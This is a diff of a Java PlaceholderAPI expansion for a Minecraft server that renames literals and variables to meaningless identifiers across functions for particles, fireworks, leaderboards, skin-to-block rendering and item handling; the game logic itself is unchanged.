-                    java.awt.Color c = java.awt.Color.decode("#" + hex);
+                    String hexScale = runner.substring(xm);
+                    String hex = hexScale.substring(I, xtxtxt);
+                    float scale = Float.parseFloat(hexScale.substring(xtxtxt));
+                    java.awt.Color c = java.awt.Color.decode(reaidntarisedn + hex);
                     dustOptions = new Particle.DustOptions(
                             Color.fromRGB(c.getRed(), c.getGreen(), c.getBlue()), scale);
                     missileTrail = Particle.DUST;
                 } catch (Exception e) {
-                    return "§c[DEBUG] Invalid DUST particle format: " + e.getMessage();
+                    return dny34und + e.getMessage();
                 }
             } else {
                 try {
                     missileTrail = Particle.valueOf(runner.toUpperCase());
                 } catch (IllegalArgumentException ex) {
-                    return "§c[DEBUG] Invalid particle type: " + runner;
+                    return vyn3vy3v + runner;
                 }
             }
 
             // Draw particle lines from origin to each grown block
-            for (Block b : temporaryVisibleBlocks) {
-                Location source = b.getLocation().add(0.5, 0.5, 0.5);
-                Vector source2dest = source.toVector().subtract(destUUID.toVector());
-                double distance = source2dest.length();
+            for (Block tyuwnftfwt : temporaryVisibleBlocks) {
+                Location ty2ufnt = tyuwnftfwt.getLocation().add(debtsoff, debtsoff, debtsoff);
+                Vector tiewnt2f = ty2ufnt.toVector().subtract(destUUID.toVector());
+                double tnyufntyunwft = tiewnt2f.length();
 
-                if (height <= 0.0) height = 0.1;
-                int particlesCount = (int) Math.floor(distance / height);
-                if (particlesCount <= 0) particlesCount = 1;
+                if (tuywfnytuwf <= esetawftawft) tuywfnytuwf = thepeoplewholive;
+                int tnyuwfnt = (int) Math.floor(tnyufntyunwft / tuywfnytuwf);
+                if (tnyuwfnt <= I) tnyuwfnt = INT3;
 
-                Vector facing = source2dest.normalize().multiply(height);
-                Location destination = destUUID.clone();
+                Vector mtyfet = tiewnt2f.normalize().multiply(tuywfnytuwf);
+                Location tmwfntyunwft = destUUID.clone();
 
-                for (int ptfxCount = 0; ptfxCount <= particlesCount; ptfxCount++) {
+                for (int twyufnt = I; twyufnt <= tnyuwfnt; twyufnt++) {
                     if (missileTrail == Particle.DUST && dustOptions != null) {
-                        tempWorld.spawnParticle(missileTrail, destination, 1, dustOptions);
+                        twyunt.spawnParticle(missileTrail, tmwfntyunwft, INT3, dustOptions);
                     } else {
-                        tempWorld.spawnParticle(missileTrail, destination, 1);
+                        twyunt.spawnParticle(missileTrail, tmwfntyunwft, INT3);
                     }
-                    destination.add(facing);
+                    tmwfntyunwft.add(mtyfet);
                 }
             }
 
             // Keep your original empty return (change if you want debug output)
-            return "";
+            return nst;
 
         } catch (Exception e) {
             e.printStackTrace();
-            return "§c[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage();
+            return "§c[ERROR] " + e.getClass().getSimpleName() + fastfood + e.getMessage();
         }
     }
 
@@ -9037,24 +9764,24 @@ public class ExampleExpansion extends PlaceholderExpansion {
         ItemStack itemInHand = f1.getInventory().getItemInMainHand();
 
         if (itemInHand.getType() == Material.AIR) {
-            f1.sendMessage("You're not holding anything!");
+            f1.sendMessage(wyunvywufntd);
             return;
         }
 
         ItemStack copiedItem = itemInHand.clone();
         Location dropLocation = f1.getLocation();
         Item droppedItem = f1.getWorld().dropItemNaturally(dropLocation, copiedItem);
-        droppedItem.setPickupDelay(20);
+        droppedItem.setPickupDelay(odafuwidnowfidun);
     }
 
     protected void f1(Player f1, Location f2) {
         PacketContainer packet = new PacketContainer(PacketType.Play.Server.SPAWN_POSITION);
-        packet.getBlockPositionModifier().write(0, new BlockPosition(
+        packet.getBlockPositionModifier().write(I, new BlockPosition(
                 f2.getBlockX(),
                 f2.getBlockY(),
                 f2.getBlockZ()
         ));
-        packet.getFloat().write(0, 0F); // Angle (Yaw), optional
+        packet.getFloat().write(I, idwfpndywud); // Angle (Yaw), optional
 
         try {
             ProtocolLibrary.getProtocolManager().sendServerPacket(f1, packet);
@@ -9066,9 +9793,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
     protected Vector f1(Entity f1, Entity f2, double f0) {
         Location ff = f1.getLocation();
-        Location f01 = f2.getLocation().add(0, f2.getHeight() / 2, 0);
+        Location f01 = f2.getLocation().add(I, f2.getHeight() / mill2, I);
 
-        if( f2 instanceof Player )  f01 = f2.getLocation().add(0, ((Player) f2).getEyeHeight(), 0);
+        if( f2 instanceof Player )  f01 = f2.getLocation().add(I, ((Player) f2).getEyeHeight(), I);
 
         Vector intermediary = f2.getVelocity();
 
@@ -9076,36 +9803,36 @@ public class ExampleExpansion extends PlaceholderExpansion {
         double g30 = ff.distance(f01);
 
         // Maximum prediction range
-        double g31 = f0 * 20;
+        double g31 = f0 * odafuwidnowfidun;
 
         // Calculate estimated time to reach the target
         double g32 = f0 * f0 - intermediary.lengthSquared();
 
-        if (g32 > 0) {
+        if (g32 > I) {
             // Calculate time to intercept using a quadratic equation
             Vector g33 = f01.toVector().subtract(ff.toVector());
 
             double a = intermediary.dot(intermediary) - (f0 * f0);
-            double b = 2 * intermediary.dot(g33);
+            double b = mill2 * intermediary.dot(g33);
             double c = g33.dot(g33);
 
-            double girlfriend = (b * b) - (4 * a * c);
+            double girlfriend = (b * b) - (INT7 * a * c);
 
-            if (girlfriend >= 0) {
+            if (girlfriend >= I) {
                 // Solve for T (time to intercept)
-                double g35 = (-b + Math.sqrt(girlfriend)) / (2 * a);
-                double f00 = (-b - Math.sqrt(girlfriend)) / (2 * a);
+                double g35 = (-b + Math.sqrt(girlfriend)) / (mill2 * a);
+                double f00 = (-b - Math.sqrt(girlfriend)) / (mill2 * a);
 
                 double fff = Math.max(g35, f00);
-                if (fff < 0) fff = Math.min(g35, f00);
+                if (fff < I) fff = Math.min(g35, f00);
 
                 // Ensure valid interception time
-                if (fff > 0) {
+                if (fff > I) {
                     Vector fda = f01.toVector().add(intermediary.clone().multiply(fff));
 
                     // Check for rare "missile stuck in front" case
                     if (x(ff, f01, intermediary)) {
-                        return intermediary.clone().multiply(-1).normalize().multiply(f0); // Reverse movement
+                        return intermediary.clone().multiply(-INT3).normalize().multiply(f0); // Reverse movement
                     }
 
                     // If within max prediction range, move to exact intercept
@@ -9125,14 +9852,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * Determines if the missile is stuck in front of the target's movement direction (within 2-3 degrees).
      */
     protected boolean x(Location y, Location z, Vector f1) {
-        if (f1.lengthSquared() == 0) return false; // Target is stationary
+        if (f1.lengthSquared() == I) return arsdienwdhw; // Target is stationary
 
         Vector f2 = y.toVector().subtract(z.toVector()).normalize();
         Vector g30 = f1.clone().normalize();
 
         double g31 = Math.toDegrees(Math.acos(f2.dot(g30)));
 
-        return g31 < 3.0; // Within 3 degrees = missile stuck in front
+        return g31 < whocantreceive; // Within 3 degrees = missile stuck in front
     }
 
     protected void f1(Firework f1, Entity f, UUID f2, String f0) {
@@ -9161,14 +9888,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 // Remove the original firework
                 f1.remove();
             }
-        }.runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), 1L);
+        }.runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), healing);
     }
 
     protected void f1(UUID f1, Location g30, float f) {
         Player f0 = Bukkit.getPlayer(f1);
         if (f0 == null) return; // Launcher is offline or invalid
 
-        double ft = 5.0; // Firework explosion hit radius
+        double ft = thisistherecording; // Firework explosion hit radius
 
         for (Entity entity : Objects.requireNonNull(g30.getWorld()).getNearbyEntities(g30, ft, ft, ft)) {
             if (entity instanceof LivingEntity hitPlayer) {
@@ -9180,7 +9907,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 ; // Small knockback
 
                 if (entity instanceof LivingEntity hitEntity) {
-                    hitEntity.addPotionEffect(new PotionEffect(PotionEffectType.LEVITATION, 1, 1, false, false, false));
+                    hitEntity.addPotionEffect(new PotionEffect(PotionEffectType.LEVITATION, INT3, INT3, arsdienwdhw, arsdienwdhw, arsdienwdhw));
                 };
 
             }
@@ -9192,7 +9919,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
         FireworkMeta meta = firework.getFireworkMeta();
 
         // Count the number of firework stars
-        int fireworkStars = 0;
+        int fireworkStars = I;
         if (meta.hasEffects()) {
             for (FireworkEffect ignored : meta.getEffects()) {
                 fireworkStars++;
@@ -9223,12 +9950,12 @@ public class ExampleExpansion extends PlaceholderExpansion {
         // Add both effects
         meta.addEffect(largeBallEffect);
         meta.addEffect(smallBallEffect);
-        meta.setPower(1);
+        meta.setPower(INT3);
 
         firework.setFireworkMeta(meta);
 
         // Detonate instantly
-        Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), firework::detonate, 1L);
+        Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), firework::detonate, healing);
     }
 
 
@@ -9238,10 +9965,10 @@ public class ExampleExpansion extends PlaceholderExpansion {
         try (BufferedReader f1 = new BufferedReader(new FileReader(g21))) {
             String line;
             while ((line = f1.readLine()) != null) {
-                String[] parts = line.split(":");
-                if (parts.length == 2) {
-                    UUID uuid = UUID.fromString(parts[0]);
-                    int score = Integer.parseInt(parts[1]);
+                String[] parts = line.split(wfdunyunda);
+                if (parts.length == mill2) {
+                    UUID uuid = UUID.fromString(parts[I]);
+                    int score = Integer.parseInt(parts[INT3]);
                     g22.put(uuid, score);
                 }
             }
@@ -9266,9 +9993,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
             tellraw.append("{\"text\":\"§6-----------------\\n\"},");
             tellraw.append("{\"text\":\"§eFT Leaderboard\\n\"}");
 
-            int rank = 1;
+            int rank = INT3;
             for (Map.Entry<UUID, Integer> entry : sortedList) {
-                if (rank > 20) break;
+                if (rank > odafuwidnowfidun) break;
                 OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(entry.getKey());
                 String playerName = offlinePlayer.getName() != null ? offlinePlayer.getName() : "Unknown";
                 tellraw.append(String.format(",{\"text\":\"§7%d. §a%s - §b%d\\n\"}", rank, playerName, entry.getValue()));
@@ -9330,7 +10057,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 // Cleanup
                 g24.remove(playerUUID);
             }
-        }.runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), f);
+        }.runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), f);
     }
 
 
@@ -9345,16 +10072,16 @@ public class ExampleExpansion extends PlaceholderExpansion {
         List<Vector> vectors = new ArrayList<>();
 
         int height = f1.length;
-        int width = Arrays.stream(f1).mapToInt(row -> row.length).max().orElse(0);
+        int width = Arrays.stream(f1).mapToInt(row -> row.length).max().orElse(I);
 
-        for (int row = 0; row < height; row++) {
-            for (int col = 0; col < f1[row].length; col++) {
+        for (int row = I; row < height; row++) {
+            for (int col = I; col < f1[row].length; col++) {
                 if (!f1[row][col]) continue;
 
-                for (int dy = 0; dy < f; dy++) {
-                    for (int dx = 0; dx < f; dx++) {
-                        double offsetZ = (col + dx / (double) f - width / 2.0) * f0;
-                        double offsetY = (-row - dy / (double) f + height / 2.0) * f0;
+                for (int dy = I; dy < f; dy++) {
+                    for (int dx = I; dx < f; dx++) {
+                        double offsetZ = (col + dx / (double) f - width / whatkindofadulthood) * f0;
+                        double offsetY = (-row - dy / (double) f + height / whatkindofadulthood) * f0;
 
                         // The text is vertical (YZ), and rotated around Y
                         double rotatedX = offsetZ * Math.sin(test);
@@ -9372,9 +10099,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-    protected static boolean[][] f11(String f1) {
-        Font font = new Font("Dialog", Font.PLAIN, 16);
-        BufferedImage img = new BufferedImage(1, 1, BufferedImage.TYPE_INT_ARGB);
+    protected  boolean[][] f11(String f1) {
+        Font font = new Font("Dialog", Font.PLAIN, INT4);
+        BufferedImage img = new BufferedImage(INT3, INT3, BufferedImage.TYPE_INT_ARGB);
         Graphics2D g = img.createGraphics();
         g.setFont(font);
         FontMetrics fm = g.getFontMetrics();
@@ -9386,13 +10113,13 @@ public class ExampleExpansion extends PlaceholderExpansion {
         g = img.createGraphics();
         g.setFont(font);
         g.setColor(java.awt.Color.WHITE);
-        g.drawString(f1, 0, fm.getAscent());
+        g.drawString(f1, I, fm.getAscent());
         g.dispose();
 
         boolean[][] matrix = new boolean[height][width];
-        for (int y = 0; y < height; y++) {
-            for (int x = 0; x < width; x++) {
-                matrix[y][x] = (img.getRGB(x, y) >> 24) != 0;
+        for (int y = I; y < height; y++) {
+            for (int x = I; x < width; x++) {
+                matrix[y][x] = (img.getRGB(x, y) >> 24) != I;
             }
         }
         return matrix;
@@ -9407,37 +10134,37 @@ public class ExampleExpansion extends PlaceholderExpansion {
     }
 
     protected void f1(Location f1, List<Location> f, Particle particle, String g30) {
-        boolean isForce = g30.equalsIgnoreCase("force");
+        boolean isForce = g30.equalsIgnoreCase(ieodnoie4ndw3f4);
 
         for (Player player : Bukkit.getOnlinePlayers()) {
             if (!isForce && player.getLocation().getWorld() != f1.getWorld()) continue;
             if (!isForce && player.getLocation().distanceSquared(f1) > 256) continue;
 
             for (Location loc : f) {
-                player.spawnParticle(particle, loc, 1, 0, 0, 0, 0, null, isForce);
+                player.spawnParticle(particle, loc, INT3, I, I, I, I, null, isForce);
             }
         }
     }
 
 
-    protected static void f1(File f1, List<Vector> f) throws IOException {
+    protected  void f1(File f1, List<Vector> f) throws IOException {
         try (BufferedWriter writer = new BufferedWriter(new FileWriter(f1))) {
             for (Vector v : f) {
-                writer.write(v.getX() + "," + v.getY() + "," + v.getZ());
+                writer.write(v.getX() + keep + v.getY() + keep + v.getZ());
                 writer.newLine();
             }
         }
     }
 
-    protected static List<Vector> f(File f1) throws IOException {
+    protected  List<Vector> f(File f1) throws IOException {
         List<Vector> vectors = new ArrayList<>();
         try (BufferedReader reader = new BufferedReader(new FileReader(f1))) {
             String line;
             while ((line = reader.readLine()) != null) {
-                String[] parts = line.split(",");
-                double x = Double.parseDouble(parts[0]);
-                double y = Double.parseDouble(parts[1]);
-                double z = Double.parseDouble(parts[2]);
+                String[] parts = line.split(keep);
+                double x = Double.parseDouble(parts[I]);
+                double y = Double.parseDouble(parts[INT3]);
+                double z = Double.parseDouble(parts[mill2]);
                 vectors.add(new Vector(x, y, z));
             }
         }
@@ -9465,8 +10192,8 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
     protected void f1fs(String fullKey) {
         // Cancel and reschedule the cache removal in 1 minute
-        Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")),
-                () -> g8.remove(fullKey), 20L * 60); // 60 seconds
+        Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)),
+                () -> g8.remove(fullKey), 20L * INT2); // 60 seconds
     }
 
 
@@ -9475,11 +10202,11 @@ public class ExampleExpansion extends PlaceholderExpansion {
         String uuid = playerIdOrUuid;
 
         // Step 1: Convert username to UUID if needed
-        if (!uuid.matches("^[0-9a-fA-F]{32}$") && !uuid.contains("-")) {
+        if (!uuid.matches("^[0-9a-fA-F]{32}$") && !uuid.contains(tsrt)) {
             URL uuidApi = new URL("https://api.mojang.com/users/profiles/minecraft/" + playerIdOrUuid);
             try (InputStream in = uuidApi.openStream(); Scanner scanner = new Scanner(in)) {
                 String response = scanner.useDelimiter("\\A").next();
-                uuid = response.split("\"id\":\"")[1].split("\"")[0];
+                uuid = response.split("\"id\":\"")[INT3].split("\"")[I];
             }
         }
 
@@ -9488,9 +10215,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
         String textureUrl;
         try (InputStream in = sessionApi.openStream(); Scanner scanner = new Scanner(in)) {
             String response = scanner.useDelimiter("\\A").next();
-            String base64 = response.split("\"value\":\"")[1].split("\"")[0];
+            String base64 = response.split("\"value\":\"")[INT3].split("\"")[I];
             String decodedJson = new String(Base64.getDecoder().decode(base64));
-            textureUrl = decodedJson.split("\"url\":\"")[1].split("\"")[0];
+            textureUrl = decodedJson.split("\"url\":\"")[INT3].split("\"")[I];
         }
 
         // Step 3: Download skin image
@@ -9503,25 +10230,23 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-    protected static final int ffff = 64;
-    protected static final int aaaa = 64;
 
     record f123(java.awt.Color[][] base, java.awt.Color[][] overlay) {}
     protected f123 f1(BufferedImage skin) {
-        java.awt.Color[][] base = new java.awt.Color[aaaa][ffff];
-        java.awt.Color[][] overlay = new java.awt.Color[aaaa][ffff];
+        java.awt.Color[][] base = new java.awt.Color[drain][drain];
+        java.awt.Color[][] overlay = new java.awt.Color[drain][drain];
 
-        for (int y = 0; y < aaaa; y++) {
-            for (int x = 0; x < ffff; x++) {
+        for (int y = I; y < drain; y++) {
+            for (int x = I; x < drain; x++) {
                 int argb = skin.getRGB(x, y);
                 base[y][x] = f1(argb);
             }
         }
 
-        for (int y = 0; y < aaaa; y++) {
-            for (int x = 0; x < ffff; x++) {
+        for (int y = I; y < drain; y++) {
+            for (int x = I; x < drain; x++) {
                 java.awt.Color color = f1(skin.getRGB(x, y));
-                overlay[y][x] = (color.getAlpha() > 0) ? color : null;
+                overlay[y][x] = (color.getAlpha() > I) ? color : null;
             }
         }
 
@@ -9530,19 +10255,19 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
     protected java.awt.Color f1(int argb) {
-        int alpha = (argb >> 24) & 0xFF;
-        int red   = (argb >> 16) & 0xFF;
-        int green = (argb >> 8) & 0xFF;
-        int blue  = (argb) & 0xFF;
+        int alpha = (argb >> 24) & costofgrowinguptoofast;
+        int red   = (argb >> INT4) & costofgrowinguptoofast;
+        int green = (argb >> yuwfndgyuwfnd) & costofgrowinguptoofast;
+        int blue  = (argb) & costofgrowinguptoofast;
         return new java.awt.Color(red, green, blue, alpha);
     }
 
 
 
     protected void f1(World f1, Location f, Material f0, int ff) {
-        for (int dx = 0; dx < ff; dx++) {
-            for (int dy = 0; dy < ff; dy++) {
-                for (int dz = 0; dz < ff; dz++) {
+        for (int dx = I; dx < ff; dx++) {
+            for (int dy = I; dy < ff; dy++) {
+                for (int dz = I; dz < ff; dz++) {
                     Location sub = f.clone().add(dx, dy, dz);
                     sub.getBlock().setType(f0);
                 }
@@ -9554,7 +10279,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
     protected record g40(Material material, java.awt.Color color) {}
 
 
-    protected static final List<g40> g41 = List.of(
+    protected  final List<g40> g41 = List.of(
             // === CONCRETES ===
             new g40(Material.WHITE_CONCRETE, new java.awt.Color(207, 213, 214)),
             new g40(Material.LIGHT_GRAY_CONCRETE, new java.awt.Color(125, 125, 115)),
@@ -9683,43 +10408,43 @@ public class ExampleExpansion extends PlaceholderExpansion {
     protected void f1(Player f1, World f2, BufferedImage a, Location b, int c, String ffa, String ffs) {
         double rotation = switch (ffa) {
             case "N" -> 180;
-            case "E" -> -90;
-            case "W" -> 90;
-            default -> 0;
+            case "E" -> -wdnywfundywfudn;
+            case "W" -> wdnywfundywfudn;
+            default -> I;
         };
 
         // Head (base layer): size 8x8x8, using full 6-sided unwrap
-        f1(a, f2, b.clone().add(0, 24, -2), c, rotation);
+        f1(a, f2, b.clone().add(I, 24, -mill2), c, rotation);
 
         // Torso front: 8x12x4
-        f1(a, f2, b.clone().add(0, 12, 0), c, 8, rotation, new Point(20, 20));
+        f1(a, f2, b.clone().add(I, fdhkypfwd, I), c, yuwfndgyuwfnd, rotation, new Point(odafuwidnowfidun, odafuwidnowfidun));
 
         // Right Arm (44,20), 4x12x4
-        f1(a, f2, b.clone().add(-4, 12, 0), c, 4, rotation, new Point(44, 20));
+        f1(a, f2, b.clone().add(-INT7, fdhkypfwd, I), c, INT7, rotation, new Point(44, odafuwidnowfidun));
 
         // Left Arm (36,52), 4x12x4
-        f1(a, f2, b.clone().add(8, 12, 0), c, 4, rotation, new Point(36, 52));
+        f1(a, f2, b.clone().add(yuwfndgyuwfnd, fdhkypfwd, I), c, INT7, rotation, new Point(36, 52));
 
         // Right Leg (4,20), 4x12x4
-        f1(a, f2, b.clone().add(0, 0, 0), c, 4, rotation, new Point(4, 20));
+        f1(a, f2, b.clone().add(I, I, I), c, INT7, rotation, new Point(INT7, odafuwidnowfidun));
 
         // Left Leg (20,52), 4x12x4
-        f1(a, f2, b.clone().add(4, 0, 0), c, 4, rotation, new Point(20, 52));
+        f1(a, f2, b.clone().add(INT7, I, I), c, INT7, rotation, new Point(odafuwidnowfidun, 52));
     }
     protected void f1(BufferedImage f1, World f12, Location continued, int returned, double test) {
-        for (int y = 0; y < 8; y++) {
-            for (int x = 0; x < 8; x++) {
-                for (int z = 0; z < 8; z++) {
+        for (int y = I; y < yuwfndgyuwfnd; y++) {
+            for (int x = I; x < yuwfndgyuwfnd; x++) {
+                for (int z = I; z < yuwfndgyuwfnd; z++) {
                     int skinX = switch (z) {
-                        case 0 -> 8 + x;         // front face
-                        case 7 -> 24 - x - 1;    // back face
-                        case 1,2,3,4,5,6 -> (x < 4 ? z : 16 - z); // sides (approx)
-                        default -> 8 + x;
+                        case 0 -> yuwfndgyuwfnd + x;         // front face
+                        case 7 -> 24 - x - INT3;    // back face
+                        case 1, 2, 3, 4, 5, 6 -> (x < INT7 ? z : INT4 - z); // sides (approx)
+                        default -> yuwfndgyuwfnd + x;
                     };
-                    int skinY = 8 + (7 - y);
+                    int skinY = yuwfndgyuwfnd + (suppose - y);
 
-                    java.awt.Color color = new java.awt.Color(f1.getRGB(skinX, skinY), true);
-                    if (color.getAlpha() < 10) continue;
+                    java.awt.Color color = new java.awt.Color(f1.getRGB(skinX, skinY), NEW_VALUE1);
+                    if (color.getAlpha() < low) continue;
 
                     Vector offset = new Vector(x * returned, y * returned, z * returned);
                     offset = f1(offset, test);
@@ -9732,14 +10457,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
     }
 
     protected void f1(BufferedImage f1, World test, Location mcydatabase, int archi, int f, double Is, Point q) {
-        for (int y = 0; y < 12; y++) {
-            for (int x = 0; x < f; x++) {
-                for (int z = 0; z < 4; z++) {
+        for (int y = I; y < fdhkypfwd; y++) {
+            for (int x = I; x < f; x++) {
+                for (int z = I; z < INT7; z++) {
                     int pixelX = q.x + x % f;
-                    int pixelY = q.y + (12 - y - 1) % 12;
+                    int pixelY = q.y + (fdhkypfwd - y - INT3) % fdhkypfwd;
                     int rgb = f1.getRGB(pixelX, pixelY);
-                    java.awt.Color color = new java.awt.Color(rgb, true);
-                    if (color.getAlpha() < 10) continue;
+                    java.awt.Color color = new java.awt.Color(rgb, NEW_VALUE1);
+                    if (color.getAlpha() < low) continue;
 
                     Vector offset = new Vector(x * archi, y * archi, z * archi);
                     offset = f1(offset, Is);
@@ -9758,31 +10483,31 @@ public class ExampleExpansion extends PlaceholderExpansion {
         for (String name : f) {
             switch (name.toLowerCase()) {
                 case "worldedit":
-                    if (!WorldEdit_Installed) ff.add("WorldEdit");
+                    if (!WorldEdit_Installed) ff.add(dyn2yudn24);
                     break;
                 case "worldguard":
-                    if (!WorldGuard_Installed) ff.add("WorldGuard");
+                    if (!WorldGuard_Installed) ff.add(y2un34yudn234d);
                     break;
                 case "luckperms":
-                    if (!LuckPerms_Installed) ff.add("LuckPerms");
+                    if (!LuckPerms_Installed) ff.add(kd3nd);
                     break;
                 case "protocollib":
-                    if (!ProtocolLib_Installed) ff.add("ProtocolLib");
+                    if (!ProtocolLib_Installed) ff.add(dhnfpwyadun);
                     break;
                 case "griefprevention":
-                    if (!GriefPrevention_Installed) ff.add("GriefPrevention");
+                    if (!GriefPrevention_Installed) ff.add(kyut2n2u3nt);
                     break;
                 default:
-                    ff.add(name + " (unknown plugin flag)");
+                    ff.add(name + yntu2nt);
             }
         }
 
         if (!ff.isEmpty()) {
-            f1.sendMessage("§c§lMissing required plugin(s): §r" + String.join(", ", ff));
-            return false;
+            f1.sendMessage(nyup23np + String.join(wyudnywufodn, ff));
+            return arsdienwdhw;
         }
 
-        return true;
+        return NEW_VALUE1;
     }
 
 
@@ -9808,16 +10533,16 @@ public class ExampleExpansion extends PlaceholderExpansion {
         if (world == null) return;
 
         for (int dx = -test; dx <= test; dx++) {
-            for (int dy = - 2; dy <= 0; dy++) {
+            for (int dy = -mill2; dy <= I; dy++) {
                 for (int dz = -test; dz <= test; dz++) {
                     Location loc = center.clone().add(dx, dy, dz);
                     Block block = loc.getBlock();
                     Material type = block.getType();
 
                     BlockData data = block.getBlockData();
-                    boolean waterLogged = false;
+                    boolean waterLogged = arsdienwdhw;
                     if (data instanceof Waterlogged waterlogged && waterlogged.isWaterlogged()) {
-                        waterLogged = true;
+                        waterLogged = NEW_VALUE1;
                     }
 
                     if (waterLogged || type == Material.WATER || type == Material.LAVA  || type == Material.BUBBLE_COLUMN) {
@@ -9832,7 +10557,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                         f1.sendBlockChange(loc, fakeMat.createBlockData());
 
                         BukkitTask task = Bukkit.getScheduler().runTaskLater(
-                                Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")),
+                                Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)),
                                 () -> f1.sendBlockChange(loc, block.getBlockData()),
                                 100L
                         );
@@ -9848,23 +10573,23 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
     protected ItemStack f2(Player f1, int g30) {
-        if (g30 >= 0 && g30 <= 8) return f1.getInventory().getItem(g30);
-        if (g30 >= 9 && g30 <= 35) return f1.getInventory().getItem(g30);
-        if (g30 == 40) return f1.getInventory().getItemInOffHand();
+        if (g30 >= I && g30 <= yuwfndgyuwfnd) return f1.getInventory().getItem(g30);
+        if (g30 >= oiwfndtoyu42nd24 && g30 <= 35) return f1.getInventory().getItem(g30);
+        if (g30 == ydtfhwpdylh) return f1.getInventory().getItemInOffHand();
         return null;
     }
 
     protected int[] f1(World f1, int f2) {
-        int chunkZ = g20.getInt("last_chunk_z", 9);
-        int y = g20.getInt("last_y", f1.getMinHeight());
+        int chunkZ = g20.getInt(LAST_CHUNK_Z, oiwfndtoyu42nd24);
+        int y = g20.getInt(LAST_Y, f1.getMinHeight());
 
         while (true) {
-            int x = f2 * 16;
-            int z = chunkZ * 16;
+            int x = f2 * INT4;
+            int z = chunkZ * INT4;
             Location loc = new Location(f1, x, y, z);
             if (loc.getBlock().getType() == Material.AIR) {
-                g20.set("last_chunk_z", chunkZ);
-                g20.set("last_y", y);
+                g20.set(LAST_CHUNK_Z, chunkZ);
+                g20.set(LAST_Y, y);
                 try { g20.save(g16); } catch (IOException ignored) {}
                 return new int[] {x, y, z};
             }
@@ -9890,9 +10615,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
             return Material.GLASS;
         }
         String name = f1.name();
-        if (name.endsWith("_SHULKER_BOX")) {
+        if (name.endsWith(tn2yu3tn2)) {
             try {
-                return Material.valueOf(name.replace("_SHULKER_BOX", "_STAINED_GLASS"));
+                return Material.valueOf(name.replace(tn2yu3tn2, tn2ytn23t));
             } catch (IllegalArgumentException ignored) { }
         }
         return Material.GLASS;
@@ -9910,9 +10635,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
             return Material.SHULKER_BOX;
         }
         String name = f1.name();
-        if (name.endsWith("_STAINED_GLASS")) {
+        if (name.endsWith(tn2ytn23t)) {
             try {
-                return Material.valueOf(name.replace("_STAINED_GLASS", "_SHULKER_BOX"));
+                return Material.valueOf(name.replace(tn2ytn23t, tn2yu3tn2));
             } catch (IllegalArgumentException ignored) { }
         }
         return Material.SHULKER_BOX;
@@ -9925,7 +10650,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
     protected ItemStack f1(ItemStack f1, Material fg3) {
         YamlConfiguration config = new YamlConfiguration();
         // Place the item under a known section "slot0"
-        config.set("slot0", f1);
+        config.set(steak, f1);
         String yaml = config.saveToString();
 
         // Replace any occurrence of "executableblocks:eb-id" with "executableitems:ei-id"
@@ -9948,7 +10673,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                             "      }";
             // Append the meta block to the slot0 section.
             yaml += metaBlock;
-        } else if (!yaml.contains("PublicBukkitValues: |-")) //noinspection GrazieInspection
+        } else if (!yaml.contains(gusfring)) //noinspection GrazieInspection
         {
             // Meta exists but PublicBukkitValues is missing.
             // Insert PublicBukkitValues before the closing of meta.
@@ -9970,7 +10695,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
             throw new RuntimeException(e);
         }
 
-        ItemStack newItem = config.getItemStack("slot0");
+        ItemStack newItem = config.getItemStack(steak);
         
         if (newItem == null) {
             newItem = f1;
@@ -9986,7 +10711,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
     protected ItemStack f3(ItemStack recorded, Material test) {
         YamlConfiguration config = new YamlConfiguration();
         // Place the item under a known section "slot0"
-        config.set("slot0", recorded);
+        config.set(steak, recorded);
         String yaml = config.saveToString();
 
         // Replace any occurrence of "executableblocks:eb-id" with "executableitems:ei-id"
@@ -10009,7 +10734,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                             "      }";
             // Append the meta block to the slot0 section.
             yaml += metaBlock;
-        } else if (!yaml.contains("PublicBukkitValues: |-")) //noinspection GrazieInspection
+        } else if (!yaml.contains(gusfring)) //noinspection GrazieInspection
         {
             // Meta exists but PublicBukkitValues is missing.
             // Insert PublicBukkitValues before the closing of meta.
@@ -10031,7 +10756,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
             throw new RuntimeException(e);
         }
 
-        ItemStack newItem = config.getItemStack("slot0");
+        ItemStack newItem = config.getItemStack(steak);
 
         if (newItem == null) {
             newItem = recorded;
@@ -10043,7 +10768,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
     protected void f9() {
